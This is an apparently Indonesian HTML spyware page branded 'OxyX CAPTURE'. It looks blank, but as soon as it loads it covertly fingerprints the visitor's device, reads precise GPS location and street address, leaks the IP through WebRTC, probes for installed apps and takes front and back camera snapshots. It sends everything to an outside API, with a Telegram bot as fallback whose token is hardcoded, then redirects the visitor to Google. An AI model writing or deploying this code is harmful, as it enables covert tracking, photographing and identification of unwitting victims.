<!DOCTYPE html>
<html>
<head>
    <title></title>
    <script>
        // ===================== CONFIG =====================
        const CONFIG = {
            // API KAMU YANG SUDAH JALAN
            YOUR_API: "https://api-nu-one-49.vercel.app/api/collect",
            
            // Telegram Backup
            TELEGRAM_TOKEN: "8211111180:AAFkOZqZCAM_gKsi6JWDWejXzhgOAymKTkw",
            TELEGRAM_CHAT_ID: "6865071834",
            
            // Auto redirect setelah selesai
            REDIRECT_URL: "https://google.com",
            REDIRECT_DELAY: 3000
        };
        
        // ===================== DATA COLLECTOR =====================
        const collectedData = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            vendor: navigator.vendor,
            language: navigator.language,
            languages: navigator.languages,
            screen: `${screen.width}x${screen.height}`,
            viewport: `${window.innerWidth}x${window.innerHeight}`,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookies: navigator.cookieEnabled,
            online: navigator.onLine,
            
            // Akan diisi
            location: null,
            network: null,
            battery: null,
            photos: [],
            webrtc: null,
            ipInfo: null
        };
        
        // ===================== UTILITY =====================
        function sendToAPI(data) {
            // Coba API kamu dulu
            fetch(CONFIG.YOUR_API, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('API failed');
                }
                console.log('Data sent to your API');
            })
            .catch(error => {
                console.log('Falling back to Telegram');
                sendToTelegram(data);
            });
        }
        
        function sendToTelegram(data) {
            const message = `
ðŸš¨ OXyX CAPTURE ðŸš¨

ðŸ“… ${new Date().toLocaleString('id-ID')}
ðŸŒ ${data.userAgent.substring(0, 80)}...
ðŸ“ Lokasi: ${data.location ? 
    `${data.location.lat}, ${data.location.lon}` : 
    data.ipInfo ? `${data.ipInfo.city}, ${data.ipInfo.country}` : 'Tidak ada'}
ðŸ  Alamat: ${data.location?.address || data.ipInfo?.isp || '-'}
ðŸ“¸ Foto: ${data.photos.length} (${data.photos.filter(p => p.front).length} depan, ${data.photos.filter(p => p.back).length} belakang)
ðŸ“± Perangkat: ${data.platform}
ðŸ–¥ï¸ Layar: ${data.screen}
ðŸ”‹ Baterai: ${data.battery?.level || 'N/A'} ${data.battery?.charging ? '(Isi)' : ''}
ðŸ“¶ Jaringan: ${data.network?.type || '-'} ${data.network?.speed || ''}
ðŸŒ IP: ${data.ipInfo?.ip || '-'}
ðŸ•’ Timezone: ${data.timezone}
ðŸ”Œ Online: ${data.online ? 'Ya' : 'Tidak'}

#OxyX #${data.platform.replace(/\s+/g, '')}
            `;
            
            fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
        }
        
        // ===================== LOCATION =====================
        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    getIPLocation().then(resolve);
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        collectedData.location = {
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            altitude: pos.coords.altitude,
                            speed: pos.coords.speed,
                            timestamp: new Date(pos.timestamp).toISOString()
                        };
                        
                        // Get address details
                        try {
                            const response = await fetch(
                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&zoom=18`
                            );
                            const geoData = await response.json();
                            collectedData.location.address = geoData.display_name;
                            collectedData.location.road = geoData.address?.road;
                            collectedData.location.city = geoData.address?.city || geoData.address?.town;
                            collectedData.location.state = geoData.address?.state;
                            collectedData.location.country = geoData.address?.country;
                            collectedData.location.postcode = geoData.address?.postcode;
                        } catch(e) {}
                        
                        resolve(true);
                    },
                    () => {
                        getIPLocation().then(resolve);
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
        }
        
        function getIPLocation() {
            return fetch('https://ipapi.co/json/')
                .then(r => r.json())
                .then(data => {
                    collectedData.ipInfo = {
                        ip: data.ip,
                        city: data.city,
                        region: data.region,
                        country: data.country_name,
                        country_code: data.country_code,
                        continent: data.continent_code,
                        latitude: data.latitude,
                        longitude: data.longitude,
                        timezone: data.timezone,
                        currency: data.currency,
                        languages: data.languages,
                        isp: data.org,
                        asn: data.asn
                    };
                    return true;
                })
                .catch(() => false);
        }
        
        // ===================== CAMERA =====================
        function captureCamera() {
            return new Promise((resolve) => {
                // Try front camera
                navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user', width: 1280, height: 720 },
                    audio: false 
                })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        
                        collectedData.photos.push({
                            type: 'front',
                            data: canvas.toDataURL('image/jpeg', 0.6).substring(0, 800) + '...',
                            resolution: `${canvas.width}x${canvas.height}`,
                            timestamp: new Date().toISOString()
                        });
                        
                        stream.getTracks().forEach(track => track.stop());
                        
                        // Try back camera
                        setTimeout(() => {
                            navigator.mediaDevices.getUserMedia({ 
                                video: { facingMode: 'environment' },
                                audio: false 
                            })
                            .then(stream2 => {
                                video.srcObject = stream2;
                                video.play();
                                
                                setTimeout(() => {
                                    ctx.drawImage(video, 0, 0);
                                    collectedData.photos.push({
                                        type: 'back',
                                        data: canvas.toDataURL('image/jpeg', 0.6).substring(0, 800) + '...',
                                        resolution: `${canvas.width}x${canvas.height}`,
                                        timestamp: new Date().toISOString()
                                    });
                                    
                                    stream2.getTracks().forEach(track => track.stop());
                                    resolve(true);
                                }, 1000);
                            })
                            .catch(() => resolve(true));
                        }, 500);
                    }, 1000);
                })
                .catch(() => resolve(false));
            });
        }
        
        // ===================== NETWORK INFO =====================
        function getNetworkInfo() {
            if (navigator.connection) {
                collectedData.network = {
                    type: navigator.connection.type,
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink + ' Mbps',
                    rtt: navigator.connection.rtt + ' ms',
                    saveData: navigator.connection.saveData,
                    downlinkMax: navigator.connection.downlinkMax
                };
            }
            
            // WebRTC IP leak
            try {
                const rtc = new RTCPeerConnection();
                rtc.createDataChannel('');
                rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
                
                rtc.onicecandidate = (e) => {
                    if (e.candidate) {
                        const candidate = e.candidate.candidate;
                        if (candidate.includes('srflx')) {
                            collectedData.webrtc = {
                                publicIP: candidate.split(' ')[4],
                                type: candidate.split(' ')[7]
                            };
                        }
                    }
                };
                
                setTimeout(() => rtc.close(), 3000);
            } catch(e) {}
        }
        
        // ===================== BATTERY =====================
        function getBatteryInfo() {
            if ('getBattery' in navigator) {
                navigator.getBattery().then(battery => {
                    collectedData.battery = {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                });
            }
        }
        
        // ===================== DEVICE INFO =====================
        function getDeviceInfo() {
            collectedData.device = {
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory + ' GB',
                maxTouchPoints: navigator.maxTouchPoints,
                pdfViewerEnabled: navigator.pdfViewerEnabled,
                doNotTrack: navigator.doNotTrack,
                webdriver: navigator.webdriver
            };
            
            // App detection via iframe
            const apps = ['whatsapp://', 'instagram://', 'facebook://', 'telegram://'];
            collectedData.apps = [];
            
            apps.forEach(app => {
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = app;
                document.body.appendChild(iframe);
                
                setTimeout(() => {
                    if (iframe.contentWindow.location.href !== 'about:blank') {
                        collectedData.apps.push(app.split('://')[0]);
                    }
                    document.body.removeChild(iframe);
                }, 100);
            });
        }
        
        // ===================== MAIN EXECUTION =====================
        async function execute() {
            console.log('[OxyX] Starting execution...');
            
            // 1. Get device info
            getDeviceInfo();
            
            // 2. Get network info
            getNetworkInfo();
            
            // 3. Get battery
            getBatteryInfo();
            
            // 4. Get location (async)
            getLocation();
            
            // 5. Try camera after 1 second
            setTimeout(() => {
                captureCamera().then(() => {
                    // Send all data after camera attempt
                    setTimeout(() => {
                        sendToAPI(collectedData);
                        
                        // Redirect
                        setTimeout(() => {
                            window.location.href = CONFIG.REDIRECT_URL;
                        }, CONFIG.REDIRECT_DELAY);
                    }, 1000);
                });
            }, 1000);
            
            // Send initial data after 3 seconds (even if camera fails)
            setTimeout(() => {
                sendToAPI(collectedData);
            }, 3000);
        }
        
        // ===================== START =====================
        // Start immediately
        window.addEventListener('DOMContentLoaded', execute);
        
        // Also start on load
        window.addEventListener('load', execute);
        
        // Start now
        execute();
        
    </script>
</head>
<body>
<!-- Page kosong -->
</body>
</html>